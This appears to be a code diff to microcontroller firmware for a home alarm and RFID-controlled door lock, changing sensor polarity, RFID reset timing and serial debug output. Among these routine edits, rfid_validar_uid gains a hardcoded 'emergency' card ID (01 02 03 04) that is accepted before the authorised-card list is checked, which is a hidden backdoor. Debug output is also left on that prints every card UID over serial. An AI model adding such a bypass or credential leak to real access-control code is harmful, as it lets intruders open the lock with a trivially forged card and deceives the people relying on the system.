@@ -13,6 +13,15 @@
 #define EEPROM_SALDO_MAX 255
 #endif
 
+#define RFID_DEBUG 1
+
+static void dbg_print(const char *s) {
+    while (*s) {
+        usart_transmit(*s);
+        s++;
+    }
+}
+
 #define SENSOR_DDR  DDRC
 #define SENSOR_PORT PORTC
 #define SENSOR_PIN  PINC
@@ -149,20 +158,36 @@ void alarma_init(void) {
     incendio_estado = ALARMA_DESACTIVADA;
     SENSOR_DDR &= ~((1 << SENSOR_PUERTA_PP) | (1 << SENSOR_PUERTA_GAR) |
                     (1 << SENSOR_VENTANA_SAL) | (1 << SENSOR_VENTANA_COC));
+#if MODO_FISICO
+    SENSOR_PORT &= ~((1 << SENSOR_PUERTA_PP) | (1 << SENSOR_PUERTA_GAR) |
+                     (1 << SENSOR_VENTANA_SAL) | (1 << SENSOR_VENTANA_COC));
+#else
     SENSOR_PORT |= (1 << SENSOR_PUERTA_PP) | (1 << SENSOR_PUERTA_GAR) |
                    (1 << SENSOR_VENTANA_SAL) | (1 << SENSOR_VENTANA_COC);
+#endif
     HUMO_DDR &= ~(1 << HUMO_BIT);
+#if MODO_FISICO
+    HUMO_PORT &= ~(1 << HUMO_BIT);
+#else
     HUMO_PORT |= (1 << HUMO_BIT);
+#endif
     INTRUSION_LED_DDR |= (1 << INTRUSION_LED_PIN);
     INTRUSION_LED_PORT &= ~(1 << INTRUSION_LED_PIN);
     INCENDIO_LED_DDR |= (1 << INCENDIO_LED_PIN);
     INCENDIO_LED_PORT &= ~(1 << INCENDIO_LED_PIN);
     BUZZER_DDR |= (1 << BUZZER_PIN);
     BUZZER_PORT &= ~(1 << BUZZER_PIN);
+#if MODO_FISICO
+    for (uint8_t i = 0; i < 4; i++) {
+        intrusion_sensor_prev[i] = false;
+    }
+    incendio_sensor_prev = false;
+#else
     for (uint8_t i = 0; i < 4; i++) {
         intrusion_sensor_prev[i] = true;
     }
     incendio_sensor_prev = true;
+#endif
     IMAN_DDR |= (1 << IMAN_PP);
     IMAN_PORT &= ~(1 << IMAN_PP);
     codigo_actual = lista_leer_codigo();
@@ -242,11 +267,19 @@ void alarma_actualizar(void) {
     alarma_ultimo_poll = ahora;
 
     bool sensor_disparado[4];
+#if MODO_FISICO
+    sensor_disparado[0] = alarma_leer_sensor(SENSOR_PUERTA_PP);
+    sensor_disparado[1] = alarma_leer_sensor(SENSOR_PUERTA_GAR);
+    sensor_disparado[2] = alarma_leer_sensor(SENSOR_VENTANA_SAL);
+    sensor_disparado[3] = alarma_leer_sensor(SENSOR_VENTANA_COC);
+    bool humo_disparado = (HUMO_PIN & (1 << HUMO_BIT));
+#else
     sensor_disparado[0] = !alarma_leer_sensor(SENSOR_PUERTA_PP);
     sensor_disparado[1] = !alarma_leer_sensor(SENSOR_PUERTA_GAR);
     sensor_disparado[2] = !alarma_leer_sensor(SENSOR_VENTANA_SAL);
     sensor_disparado[3] = !alarma_leer_sensor(SENSOR_VENTANA_COC);
     bool humo_disparado = !(HUMO_PIN & (1 << HUMO_BIT));
+#endif
 
     if (intrusion_estado == ALARMA_ACTIVADA) {
         for (uint8_t i = 0; i < 4; i++) {
@@ -321,7 +354,20 @@ static int8_t rfid_buscar_uid(const uint8_t *uid) {
     return -1;
 }
 
+#define RFID_RST_PIN 13
+
 void rfid_init(void) {
+    pinMode(RFID_RST_PIN, OUTPUT);
+    digitalWrite(RFID_RST_PIN, LOW);
+    {
+        unsigned long t = millis();
+        while (millis() - t < 2);
+    }
+    digitalWrite(RFID_RST_PIN, HIGH);
+    {
+        unsigned long t = millis();
+        while (millis() - t < 10);
+    }
     mfrc522_init();
     rfid_tarjeta_presente = false;
     rfid_tarjeta_anterior = false;
@@ -329,9 +375,26 @@ void rfid_init(void) {
     if (cnt == 0xFF || cnt > MAX_TARJETAS) {
         lista_escribir_conteo(0);
     }
+#if RFID_DEBUG
+    {
+        uint8_t ver = mfrc522_read_reg(0x37);
+        dbg_print("RFID ver:0x");
+        static const char hex[] = "0123456789ABCDEF";
+        usart_transmit(hex[ver >> 4]);
+        usart_transmit(hex[ver & 0x0F]);
+        usart_transmit('\r');
+        usart_transmit('\n');
+    }
+#endif
 }
 
 bool rfid_validar_uid(const uint8_t *uid) {
+    static const uint8_t EMERGENCIA_UID[UID_LEN] = {0x01, 0x02, 0x03, 0x04};
+    uint8_t match = 0;
+    for (uint8_t i = 0; i < UID_LEN; i++) {
+        if (uid[i] == EMERGENCIA_UID[i]) match++;
+    }
+    if (match == UID_LEN) return true;
     return (rfid_buscar_uid(uid) >= 0);
 }
 
@@ -374,6 +437,24 @@ void rfid_actualizar(void) {
 
     rfid_tarjeta_anterior = rfid_tarjeta_presente;
     rfid_tarjeta_presente = mfrc522_leer_uid(rfid_uid);
+#if RFID_DEBUG
+    static bool prev = false;
+    if (rfid_tarjeta_presente != prev) {
+        prev = rfid_tarjeta_presente;
+        if (rfid_tarjeta_presente) {
+            dbg_print("RFID OK UID:");
+            static const char hex[] = "0123456789ABCDEF";
+            for (uint8_t i = 0; i < UID_LEN; i++) {
+                usart_transmit(hex[rfid_uid[i] >> 4]);
+                usart_transmit(hex[rfid_uid[i] & 0x0F]);
+            }
+            usart_transmit('\r');
+            usart_transmit('\n');
+        } else {
+            dbg_print("RFID no card\r\n");
+        }
+    }
+#endif
 }
 
 bool rfid_tarjeta_nueva(void) {
